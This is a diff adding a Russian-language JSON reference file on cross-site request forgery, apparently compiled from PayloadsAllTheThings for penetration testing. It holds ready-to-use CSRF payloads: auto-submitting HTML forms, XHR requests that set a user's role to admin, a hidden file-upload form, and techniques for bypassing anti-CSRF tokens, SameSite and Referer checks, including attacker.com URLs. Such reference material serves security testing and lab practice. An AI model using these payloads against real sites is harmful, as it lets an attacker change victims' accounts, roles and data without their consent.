@@ -1,0 +1,167 @@
+{
+  "category": "Cross-Site Request Forgery",
+  "source": "PayloadsAllTheThings/Cross-Site Request Forgery/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "CSRF Cheat Sheet — дерево решений (TrustFoundry)",
+      "language": "image",
+      "tags": ["methodology", "cheatsheet", "csrf"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/csrf/CSRF-CheatSheet.png",
+        "caption": "Блок-схема проверки CSRF: реагирует ли приложение на сторонний запрос → требуется ли CSRF-токен → GET или POST → можно ли построить простой запрос (text/plain, x-www-form-urlencoded, multipart) или нужен сложный (application/json). Ветки ведут к подходящему PoC (GET/POST/JSON) или к выводу «CSRF Not Possible». Источник: TrustFoundry / PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Что такое CSRF",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "CSRF (Cross-Site Request Forgery) заставляет аутентифицированного пользователя выполнить нежелательное действие в приложении, где он уже залогинен. Атака нацелена на запросы, меняющие состояние, а не на кражу данных — атакующий не видит ответ на подделанный запрос.\n\nКогда вы залогинены, у вас есть сессия. Её идентификатор хранится в cookie браузера и отправляется с каждым запросом к сайту. Даже если запрос инициирует сторонний сайт, cookie всё равно уходит вместе с запросом, и он обрабатывается так, будто его сделал залогиненный пользователь."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Как тестировать на CSRF",
+      "language": "text",
+      "tags": ["methodology", "how-to-test"],
+      "body": "• Ищи запросы, меняющие состояние: смена email/пароля/имени, смена роли, перевод средств, добавление прав, удаление.\n• Проверь, что в запросе нет анти-CSRF токена (или он не валидируется). Если токен есть — пробуй обходы: убрать токен, пустой токен, токен другого пользователя, предсказуемый токен.\n• Определи тип запроса по cheat sheet: GET / POST / JSON. Подбери минимальный PoC.\n• Для POST-JSON: попробуй сменить Content-Type на text/plain или x-www-form-urlencoded — «простой» запрос не вызывает preflight и часто проходит.\n• Проверь SameSite cookie (Lax/Strict/None) и валидацию Referer/Origin — это основные защиты.\n• Сгенерируй PoC, открой во второй сессии/инкогнито с залогиненной жертвой, подтверди, что действие выполнилось."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "0xInfection/XSRFProbe — The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.\nBurp Suite → правый клик по запросу → Engagement tools → Generate CSRF PoC."
+    },
+
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "HTML GET — с действием пользователя (клик)",
+      "language": "html",
+      "tags": ["poc", "get"],
+      "body": "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "HTML GET — без действия пользователя (img)",
+      "language": "html",
+      "tags": ["poc", "get", "no-interaction"],
+      "body": "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "HTML POST — с действием пользователя (клик)",
+      "language": "html",
+      "tags": ["poc", "post"],
+      "body": "<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">\n <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"Submit Request\" />\n</form>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "HTML POST — autosubmit, без действия пользователя",
+      "language": "html",
+      "tags": ["poc", "post", "autosubmit"],
+      "body": "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">\n <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"Submit Request\" />\n</form>\n \n<script>\n document.getElementById(\"autosubmit\").submit();\n</script>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "HTML POST — multipart/form-data с загрузкой файла (клик)",
+      "language": "html",
+      "tags": ["poc", "multipart", "file-upload"],
+      "body": "<script>\nfunction launch(){\n    const dT = new DataTransfer();\n    const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );\n    dT.items.add( file );\n    document.xss[0].files = dT.files;\n\n    document.xss.submit()\n}\n</script>\n\n<form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\">\n<input id=\"file\" type=\"file\" name=\"file\"/>\n<input type=\"submit\" name=\"\" value=\"\" size=\"0\" />\n</form>\n<button value=\"button\" onclick=\"launch()\">Submit Request</button>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "JSON GET — простой запрос (XHR)",
+      "language": "html",
+      "tags": ["poc", "json", "get"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"http://www.example.com/api/currentuser\");\nxhr.send();\n</script>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "JSON POST — простой запрос (XHR, text/plain)",
+      "language": "html",
+      "tags": ["poc", "json", "post"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\n//application/json is not allowed in a simple request. text/plain is the default\nxhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n//You will probably want to also try one or both of these\n//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n//xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\");\nxhr.send('{\"role\":admin}');\n</script>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "JSON POST — autosubmit-форма (обход защит браузера)",
+      "language": "html",
+      "tags": ["poc", "json", "autosubmit", "bypass"],
+      "body": "<form id=\"CSRF_POC\" action=\"www.example.com/api/setrole\" enctype=\"text/plain\" method=\"POST\">\n// this input will send : {\"role\":admin,\"other\":\"=\"}\n <input type=\"hidden\" name='{\"role\":admin, \"other\":\"'  value='\"}' />\n</form>\n<script>\n document.getElementById(\"CSRF_POC\").submit();\n</script>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "JSON POST — сложный запрос (XHR, application/json)",
+      "language": "html",
+      "tags": ["poc", "json", "post"],
+      "body": "<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\nxhr.withCredentials = true;\nxhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\nxhr.send('{\"role\":admin}');\n</script>"
+    },
+    {
+      "subcategory": "PoC шаблоны",
+      "title": "Заметка про simple vs complex request",
+      "language": "text",
+      "tags": ["json", "preflight", "cors"],
+      "body": "application/json в «простом» запросе не разрешён — по умолчанию text/plain. «Простой» запрос (GET/POST/HEAD с Content-Type text/plain | x-www-form-urlencoded | multipart/form-data) не вызывает CORS preflight и уходит с cookie → пригоден для CSRF.\n\nСложный запрос (application/json;charset=UTF-8 и т.п.) вызывает preflight OPTIONS. Сработает, только если сервер сам отвечает разрешающими CORS-заголовками. Форма с enctype=\"text/plain\" умеет «склеить» валидный JSON и обойти protections, требующие preflight (например, Standard-режим Enhanced Tracking Protection в Firefox)."
+    },
+
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Защита отсутствует",
+      "language": "text",
+      "tags": ["bypass", "no-token"],
+      "body": "Самый простой случай: анти-CSRF токена нет вообще, валидация Referer/Origin отсутствует, SameSite не задан. Любой стандартный PoC (GET/POST/JSON) сработает напрямую.\nLab: PortSwigger — CSRF vulnerability with no defenses."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Токен валидируется только для одного метода",
+      "language": "text",
+      "tags": ["bypass", "method-override", "token"],
+      "body": "Иногда токен проверяется только для POST, но не для GET (или наоборот). Поменяй метод запроса: преврати POST в GET (параметры в query-string) — валидация токена может отвалиться и его можно вообще не присылать.\nLab: PortSwigger — CSRF where token validation depends on request method."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Токен проверяется только если присутствует",
+      "language": "text",
+      "tags": ["bypass", "token", "empty-token"],
+      "body": "Сервер валидирует токен, только когда параметр прислан. Полностью убери параметр токена из запроса (не пустой — а отсутствующий) — проверка пропускается, и CSRF проходит.\nLab: PortSwigger — CSRF where token validation depends on token being present."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Токен не привязан к сессии пользователя",
+      "language": "text",
+      "tags": ["bypass", "token", "another-user"],
+      "body": "Токен валиден, но не связан с конкретной сессией. Залогинься своей учёткой, добудь валидный токен и вставь его в PoC для жертвы — сервер примет «чужой» токен.\nLab: PortSwigger — CSRF where token is not tied to user session."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Токен привязан к не-сессионной cookie",
+      "language": "text",
+      "tags": ["bypass", "token", "cookie"],
+      "body": "Токен сверяется с отдельной (не сессионной) cookie. Если есть способ выставить жертве свою cookie (например, через инъекцию заголовка/поддомен), задай пару cookie+токен от себя — проверка совпадёт.\nLab: PortSwigger — CSRF where token is tied to non-session cookie."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Токен дублируется в cookie (double-submit)",
+      "language": "text",
+      "tags": ["bypass", "token", "double-submit"],
+      "body": "Паттерн double-submit: сервер лишь сверяет, что токен в параметре равен токену в cookie, не проверяя его сам. Если можешь выставить жертве cookie, задай одинаковое произвольное значение и в cookie, и в параметре формы — они совпадут.\nLab: PortSwigger — CSRF where token is duplicated in cookie."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Referer проверяется только при наличии заголовка",
+      "language": "text",
+      "tags": ["bypass", "referer"],
+      "body": "Сервер валидирует Referer, только если он прислан. Подави отправку Referer полностью, и проверка пропустится:\n\n<meta name=\"referrer\" content=\"no-referrer\">\n\nили атрибут rel=\"noreferrer\" на ссылке/форме.\nLab: PortSwigger — CSRF where Referer validation depends on header being present."
+    },
+    {
+      "subcategory": "Обход защит (токены / SameSite / Referer)",
+      "title": "Сломанная валидация Referer",
+      "language": "text",
+      "tags": ["bypass", "referer"],
+      "body": "Если сервер проверяет лишь подстроку (домен присутствует где-то в Referer), обойди наивную проверку. Помести ожидаемый домен в свой URL — как поддомен или как параметр:\n\nhttp://attacker.com/?vulnerable-website.com\nhttp://vulnerable-website.com.attacker.com/\n\nЧтобы полный путь/query попал в Referer, ослабь политику страницы:\n<meta name=\"referrer\" content=\"unsafe-url\">\nLab: PortSwigger — CSRF with broken Referer validation."
+    }
+  ]
+}
